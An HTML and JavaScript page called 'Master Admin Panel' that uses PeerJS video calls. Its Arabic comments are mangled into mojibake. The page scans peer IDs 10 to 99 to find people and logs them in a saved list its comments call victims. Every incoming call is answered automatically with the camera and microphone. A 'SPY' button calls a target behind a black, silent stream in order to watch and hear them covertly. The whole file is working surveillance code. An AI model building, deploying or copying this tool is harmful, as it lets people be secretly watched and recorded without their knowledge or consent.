<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Admin Panel</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        /* Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', monospace; }
        body { background: #000; color: #0f0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ */
        #loginScreen { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1; }
        .card { border: 2px solid #0f0; padding: 30px; background: #050505; text-align: center; box-shadow: 0 0 20px #0f0; border-radius: 10px; }
        .my-id { font-size: 3rem; font-weight: bold; margin: 20px 0; color: white; text-shadow: 0 0 10px #0f0; }
        
        button { width: 100%; padding: 15px; background: #003300; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-weight: bold; margin-top: 10px; font-size: 1.1rem; }
        button:hover { background: #0f0; color: black; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ */
        #mainInterface { display: none; height: 100%; flex-direction: column; z-index: 1; }
        .video-container { flex: 1; display: flex; border-bottom: 2px solid #0f0; }
        .vid-box { flex: 1; border-right: 1px solid #0f0; position: relative; background: #111; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .label { position: absolute; bottom: 10px; left: 10px; background: black; padding: 5px; border: 1px solid #0f0; }

        /* ========================================= */
        /* ============== Ø²Ø± ÙˆÙ‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø£Ø¯Ù…Ù† ========== */
        /* ========================================= */

        /* 1. Ø²Ø± Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª (Ø¸Ø§Ù‡Ø± Ø¯Ø§Ø¦Ù…Ø§Ù‹) */
        #adminBtn {
            position: fixed; top: 20px; left: 20px;
            font-size: 2rem; cursor: pointer; z-index: 99999;
            background: black; border: 1px solid #0f0; border-radius: 50%;
            width: 50px; height: 50px; display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 10px #0f0;
        }
        #adminBtn:hover { transform: rotate(90deg); transition: 0.5s; background: #003300; }

        /* 2. Ù†Ø§ÙØ°Ø© Ø§Ù„ØªØ­ÙƒÙ… (Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø©) */
        #adminModal {
            display: none; /* Ù…Ø®ÙÙŠØ© */
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); z-index: 100000;
            align-items: center; justify-content: center;
            backdrop-filter: blur(5px);
        }

        .modal-content {
            background: #000; border: 2px solid #0f0; width: 90%; max-width: 500px;
            padding: 20px; box-shadow: 0 0 50px #0f0; border-radius: 10px;
            max-height: 80vh; overflow-y: auto;
        }

        .modal-header { display: flex; justify-content: space-between; border-bottom: 1px dashed #0f0; padding-bottom: 10px; margin-bottom: 20px; }
        .close-btn { color: red; cursor: pointer; font-weight: bold; border: 1px solid red; padding: 2px 10px; }

        /* Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ø¶Ø­Ø§ÙŠØ§ */
        .target-list { margin-top: 10px; }
        .target-item { 
            display: flex; justify-content: space-between; align-items: center; 
            background: #050505; border: 1px solid #333; padding: 10px; margin-bottom: 5px; 
        }
        .btn-small { padding: 5px 10px; font-size: 0.8rem; width: auto; margin: 0 2px; }

    </style>
</head>
<body>

    <!-- âš™ï¸ Ø²Ø± Ø§Ù„Ø£Ø¯Ù…Ù† (Ù…ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø¦Ù…Ø§Ù‹) -->
    <div id="adminBtn" onclick="toggleAdmin()">âš™ï¸</div>

    <!-- ğŸ› ï¸ Ù†Ø§ÙØ°Ø© Ø§Ù„Ø£Ø¯Ù…Ù† Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø© -->
    <div id="adminModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>ğŸ•µï¸â€â™‚ï¸ CONTROL PANEL</h2>
                <div class="close-btn" onclick="toggleAdmin()">X</div>
            </div>

            <div style="margin-bottom: 20px;">
                <h3>ğŸ“¡ RADAR SCANNER</h3>
                <p style="color:#777; font-size:0.8rem">Scan range (10-99) to find users.</p>
                <button onclick="startAutoScan()" id="scanBtn">â–¶ START AUTO SCAN</button>
            </div>

            <div>
                <h3>ğŸ“‹ DETECTED TARGETS</h3>
                <div id="targetsContainer" class="target-list">
                    <div style="text-align:center; color:#555;">No targets found yet...</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© -->
    <div id="loginScreen">
        <div class="card">
            <h1>SYSTEM LOGIN</h1>
            <p>MY ID:</p>
            <div class="my-id" id="myIdDisplay">--</div>
            <div style="font-size:0.8rem; color:#888;">Share this number or use Admin Panel</div>
        </div>
    </div>

    <!-- Ø´Ø§Ø´Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ -->
    <div id="mainInterface">
        <div class="video-container">
            <div class="vid-box">
                <video id="localVideo" autoplay muted></video>
                <div class="label">ADMIN (YOU)</div>
            </div>
            <div class="vid-box">
                <video id="remoteVideo" autoplay></video>
                <div class="label">TARGET</div>
            </div>
        </div>
        <button onclick="location.reload()" style="background:red; color:white; border-color:red; margin:0;">ğŸ”´ DISCONNECT</button>
    </div>

    <script>
        // Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù‡ÙˆÙŠØ© (Ø£Ø±Ù‚Ø§Ù… ØµØºÙŠØ±Ø© Ù„ØªØ³Ù‡ÙŠÙ„ Ø§Ù„Ø¨Ø­Ø«)
        const myId = Math.floor(Math.random() * (99 - 10 + 1) + 10).toString();
        document.getElementById('myIdDisplay').innerText = myId;

        let peer = new Peer(myId);
        let conn, call, localStream;
        
        // Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¶Ø­Ø§ÙŠØ§
        let targets = JSON.parse(localStorage.getItem('savedTargets') || "[]");

        // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
            localStream = stream;
            document.getElementById('localVideo').srcObject = stream;
        });

        // --- Ø£Ø­Ø¯Ø§Ø« PeerJS ---
        peer.on('open', id => console.log('My ID:', id));
        
        peer.on('connection', c => {
            conn = c;
            addTarget(conn.peer); // Ø­ÙØ¸ Ø§Ù„Ø¶Ø­ÙŠØ©
            setupConn();
        });

        peer.on('call', incomingCall => {
            incomingCall.answer(localStream);
            call = incomingCall;
            call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
            addTarget(incomingCall.peer); // Ø­ÙØ¸ Ø§Ù„Ø¶Ø­ÙŠØ©
            enterChat();
        });

        // --- ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ø£Ø¯Ù…Ù† ---

        // 1. ÙØªØ­/ØºÙ„Ù‚ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©
        function toggleAdmin() {
            let modal = document.getElementById('adminModal');
            modal.style.display = (modal.style.display === 'flex') ? 'none' : 'flex';
            renderTargets(); // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø¹Ù†Ø¯ Ø§Ù„ÙØªØ­
        }

        // 2. Ø§Ù„Ø¨Ø­Ø« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ (Ø§Ù„Ø±Ø§Ø¯Ø§Ø±)
        let isScanning = false;
        let scanIdx = 10;

        function startAutoScan() {
            if(isScanning) return;
            isScanning = true;
            document.getElementById('scanBtn').innerText = "SCANNING... (PLEASE WAIT)";
            scanLoop();
        }

        function scanLoop() {
            if(!isScanning) return;
            if(scanIdx > 99) scanIdx = 10; // Ø¥Ø¹Ø§Ø¯Ø© Ù…Ù† Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©

            let targetId = scanIdx.toString();
            
            // Ù„Ø§ ØªØªØµÙ„ Ø¨Ù†ÙØ³Ùƒ
            if(targetId !== myId) {
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§ØªØµØ§Ù„ Ø³Ø±ÙŠØ¹Ø©
                let testConn = peer.connect(targetId);
                
                testConn.on('open', () => {
                    // ÙˆØ¬Ø¯Ù†Ø§ Ø´Ø®Øµ!
                    isScanning = false;
                    document.getElementById('scanBtn').innerText = "âœ… FOUND TARGET: " + targetId;
                    addTarget(targetId);
                    alert("Target Found: " + targetId);
                    connectTo(targetId); // Ø§ØªØµÙ„ Ø¨Ù‡ ÙÙˆØ±Ø§Ù‹
                });

                // Ø¥Ø°Ø§ ÙØ´Ù„ØŒ Ø¬Ø±Ø¨ Ø§Ù„ØªØ§Ù„ÙŠ Ø¨Ø¹Ø¯ ÙˆÙ‚Øª Ù‚ØµÙŠØ±
                setTimeout(() => {
                    if(isScanning && !testConn.open) {
                        testConn.close();
                        scanIdx++;
                        scanLoop();
                    }
                }, 150); // Ø³Ø±Ø¹Ø© Ø§Ù„Ù…Ø³Ø­
            } else {
                scanIdx++;
                scanLoop();
            }
        }

        // 3. Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©
        function addTarget(id) {
            if(!targets.includes(id)) {
                targets.push(id);
                localStorage.setItem('savedTargets', JSON.stringify(targets));
                renderTargets();
            }
        }

        function renderTargets() {
            let container = document.getElementById('targetsContainer');
            if(targets.length === 0) return;
            
            container.innerHTML = '';
            targets.forEach(id => {
                container.innerHTML += `
                    <div class="target-item">
                        <span style="color:#fff; font-weight:bold;">ID: ${id}</span>
                        <div>
                            <button class="btn-small" onclick="spyOn('${id}')" style="border-color:yellow; color:yellow;">ğŸ‘ï¸ SPY</button>
                            <button class="btn-small" onclick="connectTo('${id}')">ğŸ“ CALL</button>
                        </div>
                    </div>
                `;
            });
        }

        // 4. Ø§Ù„Ø§ØªØµØ§Ù„ ÙˆØ§Ù„ØªØ¬Ø³Ø³
        function connectTo(id) {
            toggleAdmin(); // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©
            conn = peer.connect(id);
            conn.on('open', () => {
                call = peer.call(id, localStream);
                call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
                enterChat();
            });
        }

        function spyOn(id) {
            toggleAdmin();
            // Ø´Ø§Ø´Ø© Ø³ÙˆØ¯Ø§Ø¡
            let canvas = document.createElement('canvas');
            canvas.width = 100; canvas.height = 100;
            let ctx = canvas.getContext('2d');
            ctx.fillStyle = "black"; ctx.fillRect(0,0,100,100);
            let blackStream = canvas.captureStream(30);
            // Ø¥Ø¶Ø§ÙØ© ØµÙˆØª ØµØ§Ù…Øª
            let audioCtx = new AudioContext();
            let dest = audioCtx.createMediaStreamDestination();
            blackStream.addTrack(dest.stream.getAudioTracks()[0]);

            call = peer.call(id, blackStream);
            call.on('stream', rs => {
                document.getElementById('remoteVideo').srcObject = rs;
                document.getElementById('localVideo').srcObject = blackStream;
                enterChat();
            });
        }

        function enterChat() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('mainInterface').style.display = 'flex';
        }

        function setupConn() { conn.on('close', () => location.reload()); }
        
        // Ø¹Ø±Ø¶ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ù…Ø¨Ø¯Ø¦ÙŠØ§Ù‹
        renderTargets();

    </script>
</body>
</html>
